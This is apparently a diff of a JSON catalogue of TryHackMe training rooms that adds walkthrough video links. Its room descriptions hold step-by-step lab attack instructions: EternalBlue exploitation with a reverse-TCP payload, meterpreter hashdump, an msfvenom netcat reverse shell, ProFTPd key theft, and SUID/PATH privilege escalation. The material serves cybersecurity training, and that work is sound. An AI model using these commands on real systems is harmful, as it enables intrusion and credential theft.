to download the file hosted in the first domain accessed by the malware? Use Detect It Easy again and use the strings functionality to see the complete URL used by the first domain. You may also filter the strings to display the desired output. If you enjoyed malware analysis, try the Intro to Malware Analysis or Dissecting PE Headers rooms next! View the \"Protocol Hierarchy\" menu. What is the \"Percent Packets\" value of the \"Hypertext Transfer Protocol\"? View the \"Conversations\". Navigate to the TCP section. Which port number has received more than 1000 packets? What is the service name of the used protocol that received more than 1000 packets? Use the \"Statistics --> Conversations\" menu and navigate to the TCP conversations. You can \"Google\" the port numbers to learn associated service names. Filter the DNS packets. What are the domain names? Enter the domains in alphabetical order and defanged format . ( format: domain[.]zzz,domain[.]zzz ) Cyberchef can defang. Filter the HTTP packets. What are the names of the requested files? Enter the names in alphabetical order and in defanged format. (format: file[.]xyz,file[.]xyz) Which IP address downloaded the executable file? Enter your answer in defanged format. Cyberchef can defang. Which domain address hosts the malicious file? Enter your answer in defanged format. View the \"GET\" request that downloads the malicious file. The \"Host\" section shows the domain address that hosts the file. What is the \"user-agent\" value used to download the non-executable file? Export objects from the PCAP file. Calculate the file hashes. What is the sha256 hash value of the executable file? \"sha256sum\" can help. Search the hash value of the executable file on VirusTotal. Navigate to the \"Behaviour\" section. There are multiple IP addresses associated with this file. We know IP addresses starting with 20[.], and 23[.] are associated with Bandit Yeti APT. What are the connected IP addresses in the mentioned pattern? Enter the IP addressed defanged and in numerical order . (format: IPADDR,IPADDR) Please note that the VT entry changed since the official walkthrough video was recorded - check the VT website to get all the IP addresses you need! We're only interested in TCP connections here. If you liked working with Wireshark, we have a comprehensive module on this helpful tool here . If you want to dive deeper, the Network Security and Traffic Analysis module is waiting for you! What is the office number of Elf Pivot McRed? After logging in, try to change the number 101 in the URL to access the profile pages of other users. Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag? After logging in, click on the profile image, copy the image address, and try incrementing or decrementing the number 101. Do you like IDOR? It's an Advent of Cyber classic! If you want more, check out the dedicated room or the Corridor challenge. What is the name given to file uploads that allow threat actors to upload any files that they want? What is the title of the web application developed by Santa's freelancer? What is the value of the flag stored in the HR Elf's Documents directory? What defence technique can be implemented to ensure that specific file types can be uploaded? What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name? What defence technique can be used to make sure malicious files that can hurt elves are not uploaded? If you want to learn more about vulnerabilities like this one, check out our Intro to Web Hacking module! What is the value of Flag1? What is the value of Flag2? What is the value of Flag3? What is the value of Flag4? If you'd like more SQLi in your life, check out this room ! Filtering for Usernames: How many usernames fit the syntax above? This regex can be seen in one of the examples in the task, marked as 'one of the most foundational regex patterns'. Minimum and maximum characters are done as \"{min,max}\" Filtering for Usernames: One username consists of a readable word concatenated with a number. What is it? Filtering for Emails: How many emails fit the syntax above? Regex may use the wildcard \".\" followed by \"+\" to match random strings. In order to match a dot, it needs to be escaped, i.e. \"\\.\" Filtering for Emails: How many unique domains are there? Filtering for Emails: What is the domain of the email with the local-part \"lewisham44\"? Filtering for Emails: What is the domain of the email with the local-part \"maxximax\"? Filtering for Emails: What is the local-part of the email with the domain name \" hotmail.com \"? Filtering for URLs: How many URLs fit the syntax provided? An optional character / set of characters may be matched by putting \"?\" after them. Characters can be grouped by putting them inside parentheses. Filtering for URLs: How many of these URLs start with \"https\"? If you feel like you could use more fundamental skills in your life, try the Linux Fundamentals module. All rooms are free in that one! What is the Challenge #1 flag? From the Challenge 1 log, what user account was created? What is the Challenge #2 flag? What was the User's path in the Challenge #2 log file? What is the Challenge #3 flag? What was the MD5 hash associated with Challenge #3 logs? If you want to learn more about Sigma, follow this task up with our Sigma room. If you liked the detection engineering aspect of it, you shoud ceck out the Yara room to learn more! What device can be used to probe the signals being sent on electrical wires between two devices? USART is faster than SPI for communication? (Yea,Nay) USART communication uses fewer wires than SPI? (Yea,Nay) USART is faster than I2C for communication? (Yea,Nay) I2C uses more wires than SPI for communication? (Yea,Nay) SPI is faster than I2C for communication? (Yea,Nay) What is the maximum number of devices that can be connected on a single pair of I2C lines? What is the new baud rate that is negotiated between the microprocessor and ESP32 chip? What is the flag that is transmitted once the new baud rate was accepted? Looking for a challenge? Try our Recent Threats module! What is the flag value after reversing the file firmwarev2.2-encrypted.gpg? Note : The flag contains underscores - if you're seeing spaces, the underscores might not be rendering. Look into the fmk/rootfs folder. What is the Paraphrase value for the binary firmwarev1.0_unsigned? After reversing the encrypted firmware, can you find the build number for rootfs ? Use ls -lah * command. Did you know we have a wonderful community on Discord ? If you join us there, you can count on nice conversation, cyber security tips & tricks, and room help from our mods and mentors. Our Discord admin has some rooms out, too - you can try an easy one or a hard one ! What port is Mosquitto running on? nmap -p- -vv --min-rate 1500 Is the device/init topic enumerated by Nmap during a script scan of all ports? (y/n) nmap -sC -sV -p- -vv --min-rate 1500 What Mosquitto version is the device using? Found from the $SYS$/broker/version topic What flag is obtained from viewing the RTSP stream? If you want to learn more check out the Command Injection room or the Vulnerability Research module! Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task. If you'd like to study cyber defence more, why not start with the Threat and Vulnerability Management module? Case 1: What is the password for Santa’s Vault? Case 1: What is the Flag? Case 2: What is Santa’s favourite thing? Case 2: What is the password for Santa’s Vault? Case 2: What is the Flag? Case 3: What is the Executive Assistant’s favourite thing? Case 3: What is Santa’s previous password? Case 3: What is Santa’s current password? Can’t really blame Santa if he’s too lazy for big password changes… He’s super busy! Try changing the last digit of his old password and see if that works. Case 3: What is the 1st part of the vault’s password? Case 3: What is the 2nd part of the vault’s password? Case 3: What is the password for Santa’s Vault? Case 3: What is the Flag? What is Santa's Code? Mission ELFPossible: What is the Abominable for a Day Flag? If you'd like to learn more about mitigating and managing potential adversary actions, check out the T hreat Intelligence module! Please help us improve by answering this 5-minute survey . Make sure to grab the flag before you click \"Submit\"! Complete the form to get the answer to this question. Make sure to grab the flag before you click \"Submit\"! Continue learning with the Pre Security , Jr Penetration Tester , or SOC Level 1 pathway! The prize winners will be announced on the 28th of December - you have until then to complete the tasks. Remember, the more questions you answer, the higher your chance of winning! The daily prize winners for the last week of the event will be announced on Twitter on Wednesday, December 28th. Are you ready to continue your learning journey on TryHackMe? (Yea,Yea)",
@@ -525,6 +693,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/archangel"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/sOVfHCkZr1w"
       }
     ],
     "skills": "Archangel Boot2root, Web exploitation, Privilege escalation, LFI",
@@ -721,6 +895,24 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/authenticationbypass"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/NGNnxD0gNDw"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/8XYtpv-3-No"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ztftsWR9ilM"
       }
     ],
     "skills": "Authentication Bypass Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.",
@@ -973,6 +1165,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/basicpentestingjt"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/xl2Xx5YOKcI"
       }
     ],
     "skills": "Basic Pentesting This is a machine that allows you to practise web app hacking and privilege escalation Deploy the machine and connect to our network Find the services exposed by the machine use an nmap scan to look for the open ports What is the name of the hidden directory on the web server(enter name without /)? use dirsearch/dirbuster to find the hidden directories. User brute-forcing to find the username & password What is the username? what about using SMB to find a username? What is the password? What about using a tool like hydra to bruteforce? What service do you use to access the server(answer in abbreviation in all caps)? what command line utility is used for remote access? Enumerate the machine to find any vectors for privilege escalation use a privilege escalation checklist or tool like LinEnum What is the name of the other user you found(all lower case)? If you have found another user, what can you do with this information? apart from a password, how else can a user access a machine? What is the final password you obtain? use john the ripper to bruteforce the passphrase",
@@ -1169,6 +1367,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/blue"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/s6rwS7UuMt8"
       }
     ],
     "skills": "Blue Deploy & hack into a Windows machine, leveraging common misconfigurations issues. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room) Command: nmap -sV -vv --script vuln TARGET_IP How many ports are open with a port number under 1000? Near the top of the nmap output: PORT STATE SERVICE What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) Revealed by the ShadowBrokers, exploits an issue within SMBv1 Start Metasploit Command: msfconsole Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........) search ms?? Show options and set the one required value. What is the name of this value? (All caps for submission) Command: show options Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: set payload windows/x64/shell/reverse_tcp With that done, run the exploit! Command: run (or exploit) Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) Google this: shell_to_meterpreter Select this (use MODULE_PATH). Show options, what option are we required to change? Set the required option, you may need to list all of the sessions to find your target here. sessions -l Run! If this doesn't work, try completing the exploit from the previous task once more. Command: run (or exploit) Once the meterpreter shell conversion completes, select that session for use. sessions SESSION_NUMBER Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column). Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? Copy this password hash to a file and research how to crack it. What is the cracked password? This password can be found within the rockyou.txt wordlist Flag1? This flag can be found at the system root. Can you C it? Flag2? This flag can be found at the location where passwords are stored within Windows. *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. I wish I wrote down where I kept my password. Luckily it's still stored here on Windows. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. You'll need to have elevated privileges to access this flag.",
@@ -1393,6 +1597,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/bof1"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/2ZZPwwXOH08"
       }
     ],
     "skills": "Buffer Overflows Learn how to get started with basic Buffer Overflows!",
@@ -2093,6 +2303,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/btwindowsinternals"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Y7zxxig27pE"
       }
     ],
     "skills": "Core Windows Processes Explore the core processes within a Windows operating system and understand what normal behaviour is. This foundational knowledge will help you identify malicious processes running on an endpoint!",
@@ -2485,6 +2701,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/cyberkillchainzmt"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/AwXqM876Ob4"
       }
     ],
     "skills": "Cyber Kill Chain  The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. You will learn what the adversaries need to do in order to achieve their goals.",
@@ -3241,6 +3463,24 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/enumerationpe"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/poSzuMg8cak"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/LlrJuJC4wI0"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/P7d_-wAFCCs"
       }
     ],
     "skills": "Enumeration This room is an introduction to enumeration when approaching an unknown corporate environment.",
@@ -3493,6 +3733,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/exploitingavulnerabilityv2"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/HMN9gQu-ZpQ"
       }
     ],
     "skills": "Exploit Vulnerabilities Learn about some of the tools, techniques and resources to exploit vulnerabilities",
@@ -4053,6 +4299,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/cybergovernanceregulation"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/_oHkaAd7kM8"
       }
     ],
     "skills": "Governance & Regulation Explore policies and frameworks vital for regulating cyber security in an organisation.",
@@ -4501,6 +4753,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/httprequestsmuggling"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/8wQ-GXhQVtY"
       }
     ],
     "skills": "HTTP Request Smuggling Learn about HTTP Request Smuggling and its different techniques.",
@@ -4529,6 +4787,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/humansattackvectors"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/qiYItvXGZnM"
       }
     ],
     "skills": "Humans as Attack Vectors Understand why and how people are targeted in cyber attacks and how the SOC helps defend them.",
@@ -4669,6 +4933,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/idor"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/axrkhwZt-iE"
       }
     ],
     "skills": "IDOR Learn how to find and exploit IDOR vulnerabilities in a web application giving you access to data that you shouldn't have.",
@@ -5201,6 +5471,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtologanalysis"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/n5Akea_m7ws"
       }
     ],
     "skills": "Intro to Log Analysis An intro to log analysis, best practices, and essential tools for effective detection and response.",
@@ -5229,6 +5505,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtologs"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/LbDUvMO3TZ0"
       }
     ],
     "skills": "Intro to Logs Learn the fundamentals of logging, data sources, collection methods and principles to step into the log analysis world.",
@@ -5313,6 +5595,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtoav"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/mjLil0QinNo"
       }
     ],
     "skills": "Introduction to Antivirus Understand how antivirus software works and what detection techniques are used to bypass malicious file checks.",
@@ -5537,6 +5825,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtonetworking"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/nGPpr_GA_94"
       }
     ],
     "skills": "Introductory Networking An introduction to networking theory and basic networking tools",
@@ -5845,6 +6139,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/jrsecanalystintrouxo"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Wzl9ZT0kmxQ"
       }
     ],
     "skills": "Junior Security Analyst Intro Play through a day in the life of a Security Analyst and experience their everyday duties. Which team do you work with as a Junior Security Analyst? Continue to the next task! Click on the green View Site button in this task and open the lab. What was the malicious IP address in the alerts? Look at the high-severity alerts and copy the IP from there. To whom did you escalate the alert with the malicious IP? Fill in the full name of the person, such as \"John Doe\". What message did you get after blocking the IP address on the firewall?",
@@ -5929,6 +6229,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/kenobi"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/60_g_hBVLbg"
       }
     ],
     "skills": "Kenobi Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. Make sure you're connected to our network and deploy the machine Scan the machine with nmap, how many ports are open? nmap ip -vvv Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares! nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP SMB has two ports, 445 and 139. Using the nmap command above, how many shares have been found? On most distributions of Linux smbclient is already installed. Lets inspect one of the shares. smbclient // MACHINE_IP /anonymous Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see? You can recursively download the SMB share too. Submit the username and password as nothing. smbget -R smb:// MACHINE_IP /anonymous Open the file on the share. There is a few interesting things found. Information generated for Kenobi when generating an SSH key for the user Information about the ProFTPD server. What port is FTP running on? Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP What mount can we see? Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version? nc machines_ip 21 We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running? searchsploit proftpd version You should have found an exploit from ProFtpd's mod_copy module . The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory. Lets mount the /var/tmp directory to our machine mkdir /mnt/kenobiNFS mount MACHINE_IP:/var /mnt/kenobiNFS ls -la /mnt/kenobiNFS We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account. What is Kenobi's user flag (/home/kenobi/user.txt)? SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null What file looks particularly out of the ordinary? Run the binary, how many options appear? Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the \"curl\" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root! What is the root flag (/root/root.txt)?",
@@ -6489,6 +6795,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/linuxshells"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/CHt3C7adQbY"
       }
     ],
     "skills": "Linux Shells Learn about scripting and the different types of Linux shells.",
@@ -6573,6 +6885,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/livingoffthelandattacks"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Wn-j88OZdiE"
       }
     ],
     "skills": "Living Off the Land Attacks Learn to detect and analyse Living Off the Land attacks using trusted Windows tools.",
@@ -6629,6 +6947,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/logoperations"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/HQB4z59UVlg"
       }
     ],
     "skills": "Log Operations Learn the operation process details.",
@@ -7133,6 +7457,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/metasploitexploitation"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/mPtyxz8nh1Q"
       }
     ],
     "skills": "Metasploit: Exploitation Using Metasploit for scanning, vulnerability assessment and exploitation.",
@@ -7161,6 +7491,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/metasploitintro"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/EK7vDlr9v5c"
       }
     ],
     "skills": "Metasploit: Introduction  An introduction to the main components of the Metasploit Framework. No answer needed What is the name of the code taking advantage of a flaw on the target system? What is the name of the code that runs on the target system to achieve the attacker's goal? What are self-contained payloads called? Is \" windows/x64/pingback_reverse_tcp\" among singles or staged payload? How would you search for a module related to Apache? Who provided the auxiliary/scanner/ssh/ssh_login module? Use the info command How would you set the LPORT value to 6666? How would you set the global value for RHOSTS to 10.10.19.23 ? What command would you use to clear a set payload? What command do you use to proceed with the exploitation phase? No answer needed.",
@@ -7189,6 +7525,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/meterpreter"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/vrIhvxkYvW4"
       }
     ],
     "skills": "Metasploit: Meterpreter Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.",
@@ -7805,6 +8147,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/networkservices"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/z7N93YvM1XM"
       }
     ],
     "skills": "Network Services Learn about, then enumerate and exploit a variety of network services and misconfigurations. Ready? Let's get going! What does SMB stand for? What type of protocol is SMB? What protocol suite do clients use to connect to the server? What systems does Samba run on? Conduct an nmap scan of your choosing, How many ports are open? What ports is SMB running on? Provide the ports in ascending order. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? What comes up as the name of the machine? Look under OS information, it might be hard to spot! What operating system version is running? What share sticks out as something we might want to investigate? What would be the correct syntax to access an SMB share called \"secret\" as user \"suit\" on a machine with the IP 10.10.10.2 on the default port? Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by: - using the username \"Anonymous\" - connecting to the share we found during the enumeration stage - and not supplying a password. Does the share allow anonymous access? Y/N? Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? What service has been configured to allow him to work from home? Okay! Now we know this, what directory on the share should we look in? This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us? What is the default name of an SSH identity file? Download this file to your local machine, and change the permissions to \"600\" using \"chmod 600 [file]\". Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag? Is Telnet a client-server protocol (Y/N)? What has slowly replaced Telnet? How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? The lack of what, means that all Telnet communication is in plaintext? What does the modern internet use to communicate securely? How many ports are open on the target machine? Note: you may need to scan non-standard ports too. Nmap won't scan all ports by default. Need to specify an additional flag before the scan. What port is this? This port is unassigned, but still lists the protocol it's using, what protocol is this? Now re-run the nmap scan, without the -p- tag, how many ports show up as open? Here, we see that by assigning telnet to a non-standard port , it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage. Based on the title returned to us, what do we think this port could be used for ? Who could it belong to? Gathering possible usernames is an important step in enumeration. Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above. Great! It's an open telnet connection! What welcome message do we receive? Remember, telnet is not running on its default port. Use your answer from task 6, question 2. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. Start a tcpdump listener on your local machine. If using your own machine with the OpenVPN connection, use: sudo tcpdump ip proto \\\\icmp -i tun0 If using the AttackBox, use: sudo tcpdump ip proto \\\\icmp -i ens5 This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on. Now, use the command \"ping [local THM ip] -c 1\" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun! We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax: \"msfvenom - p cmd / unix / reverse_netcat lhost =[local tun0 ip] lport = 4444 R\" -p = payload lhost = our local host IP address (this is your machine's IP address) lport = the port to listen on (this is the port on your machine) R = export the payload in raw format What word does the generated payload start with? Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using: \"nc -lvnp [listening port]\" What would the command look like for the listening port we selected in our payload? Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine! Success! What is the contents of flag.txt? What communications model does FTP use? What's the standard FTP port? How many modes of FTP connection are there? Run an nmap scan of your choice. How many ports are open on the target machine? What port is ftp running on? What variant of FTP is running on it? Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing \" ftp [IP] \" into the console, and entering \"anonymous\", and no password when prompted. What is the name of the file in the anonymous FTP directory? What do we think a possible username could be? Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that... What is the password for the user \"mike\"? Bingo! Now, let's connect to the FTP server as this user using \"ftp [IP]\" and entering the credentials when prompted What is ftp.txt? Well done, you did it!",
@@ -7833,6 +8181,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/networkservices2"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/WQsmEZj-lIA"
       }
     ],
     "skills": "Network Services 2 Enumerating and Exploiting More Common Network Services & Misconfigurations Ready? Let's get going! What does NFS stand for? What process allows an NFS client to interact with a remote directory as though it was a physical device? What does your Operating System do to access a physical drive? What does NFS use to represent files and directories on the server? What protocol does NFS use to communicate between the server and client? What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2 Can a Windows NFS server share files with a Linux client? (Y/N) Can a Linux NFS server share files with a MacOS client? (Y/N) What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research. Run an nmap scan of your choice. How many ports are open on the target machine? Nmap won't scan all ports by default. Need to specify an additional flag before the scan. Which port contains the service we're looking to enumerate? Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share? Time to mount the share to our local machine! First, use \" mkdir /tmp/mount \" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside? Have a look inside this directory, look at the files. Looks like we're inside a user's home directory... Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde rs could cont a in keys that would give us remote access to the server? Which of these keys is most useful to us? What is the default name of an SSH identity file? Copy this file to a different location your local machine, and change the permissions to \"600\" using \"chmod 600 [file]\". Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to. Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N) First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory. Download the bash executable to your Downloads directory. Then use \"cp ~/Downloads/bash .\" to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using \"sudo chown root bash\" Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using \"sudo chmod +[permission] bash\". What letter do we use to set the SUID bit set using chmod? Let's do a sanity check, let's check the permissions of the \"bash\" executable using \"ls -la bash\". What does the permission set look like? Make sure that it ends with -sr-x. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with \" ./bash -p \". The -p persists the permissions, so that it can run as root 